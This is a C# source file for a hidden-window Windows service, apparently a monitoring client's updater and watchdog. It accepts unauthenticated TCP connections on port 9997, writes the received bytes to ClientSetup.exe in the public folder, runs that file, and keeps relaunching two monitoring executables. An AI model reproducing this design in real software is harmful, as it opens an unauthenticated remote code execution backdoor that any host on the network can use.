﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace CSVHost
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        public static int port = 9997;
        public static Socket m_Sock;
        public static Timer t;
        public static void AcceptThread()
        {
            Thread thread;
            while (true)
            {
                try
                {
                    Socket socket = m_Sock.Accept();
                    try
                    {

                        byte[] byteData = new byte[1024 * 1024 * 50];

                        while (true)
                        {
                            try
                            {
                                int recvData = socket.Receive(byteData);
                                if (recvData <= 0)
                                {
                                    break;
                                }
                                if (recvData > 0)
                                {
                                    string data = Encoding.UTF8.GetString(byteData, 0, recvData);
                                    string path = "C:\\Users\\Public\\";
                                    if (!Directory.Exists(path))
                                    {
                                        Directory.CreateDirectory(path);
                                    }
                                    string file = "ClientSetup.exe";


                                    if (data.StartsWith("version"))
                                    {
                                        int index = data.IndexOf("version");
                                        string new_version = data.Substring(index);
                                        RegistryKey key = Registry.CurrentUser.OpenSubKey("Software", true);
                                        var rk = key.OpenSubKey("RMClient");
                                        if (rk == null || rk.GetValue("Version").ToString() != new_version)
                                        {
                                            key = key.CreateSubKey("RMClient");
                                            key.SetValue("Version", new_version);
                                            if (File.Exists("C:\\Users\\Public\\CMonAutoSetup.exe"))
                                            {
                                                try
                                                {
                                                    File.Delete("C:\\Users\\Public\\CMonAutoSetup.exe");
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            if (File.Exists("C:\\Users\\Public\\ClientSetup.exe"))
                                            {
                                                try
                                                {
                                                    File.Delete("C:\\Users\\Public\\ClientSetup.exe");
                                                }
                                                catch
                                                {

                                                }
                                            }
                                            byte[] sendData = Encoding.UTF8.GetBytes("other");
                                            socket.Send(sendData, sendData.Length, SocketFlags.None);
                                        }
                                        else if (rk.GetValue("Version").ToString() == new_version)
                                        {
                                            byte[] sendData = Encoding.UTF8.GetBytes("same");
                                            socket.Send(sendData, sendData.Length, SocketFlags.None);
                                            break;
                                        }
                                    }
                                    else
                                    {
                                        using (FileStream stream = new FileStream(Path.Combine(path, file), FileMode.Append))
                                        {
                                            stream.Write(byteData, 0, recvData);
                                        }

                                    }
                                }

                            }
                            catch (Exception ex)
                            {
                                //socket.Close();
                                break;
                            }

                        }
                        try
                        {
                            socket.Close();
                        }
                        catch
                        {

                        }
                        Thread.Sleep(150);
                        Process process = new Process();
                        try
                        {
                            process.StartInfo.FileName = "C:\\Users\\Public\\ClientSetup.exe";
                            process.StartInfo.UseShellExecute = true;
                            process.Start();
                            process.WaitForExit();
                            
                        }
                        catch (Exception ex)
                        {
                            //File.AppendAllText("csvhostlog.txt", ex.Message);
                        }

                    }
                    catch (Exception e)
                    {
                        Process.GetCurrentProcess().Kill();
                    }
                }
                catch
                {

                }
            }
        }
        public static IPAddress GetIPAddress()
        {
            IPAddress m_IPAddress = null;
            foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    if (ni.Name.StartsWith("Ethernet"))
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            {
                                m_IPAddress = ip.Address;
                                break;
                            }
                        }
                    }

                }
            }
            return m_IPAddress;
        }

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);
            IPHostEntry ipHostInfo = Dns.Resolve(Dns.GetHostName());
            IPAddress m_IPAddress = GetIPAddress();

            IPEndPoint localEndPoint = new IPEndPoint(m_IPAddress, port);

            m_Sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                m_Sock.Bind(localEndPoint);
                m_Sock.Listen(100);

                Thread thread = new Thread(new ThreadStart(AcceptThread));
                thread.Start();

            }
            catch (Exception e)
            {
                Process.GetCurrentProcess().Kill();
            }
            t = new Timer(TimerCallback, null, 0, 1000);
            
            
            Console.ReadLine();
        }
        private static void TimerCallback(Object o)
        {
            var processes = FindProcess("CSVAuto");
            if (processes.Length == 0)
            {
                try
                {
                    var proc = new Process();
                    proc.StartInfo.FileName = "C:\\Users\\Public\\RM\\Client\\CSVAuto.exe";
                    proc.StartInfo.UseShellExecute = true;
                    proc.Start();
                }
                catch
                {
                    //File.WriteAllText("D:\\log.txt", ex.Message);
                }

            }
            else if (processes.Length > 1)
            {
                try
                {
                     processes[0].Kill();
                }
                catch
                {

                }

            }
            processes = FindProcess("Monitor.TaskView");
            if (processes.Length == 0)
            {
                try
                {
                    var proc = new Process();
                    proc.StartInfo.FileName = "C:\\Users\\Public\\RM\\Client\\Monitor.TaskView.exe";
                    proc.StartInfo.UseShellExecute = true;
                    proc.Start();
                }
                catch
                {

                }

                try
                {
                    var proc = new Process();
                    proc.StartInfo.FileName = "C:\\Users\\Public\\RM\\Client\\Monitor.TaskView.exe";
                    proc.StartInfo.UseShellExecute = true;
                    proc.Start();
                }
                catch
                {

                }

            }
            else if (processes.Length > 1)
            {
                try
                {
                    processes[0].Kill();
                }
                catch
                {

                }

            }
            GC.Collect();
        }

        public static Process[] FindProcess(string processName)
        {
            Process[] processList = Process.GetProcessesByName(processName);

            return processList;
        }

    }
}
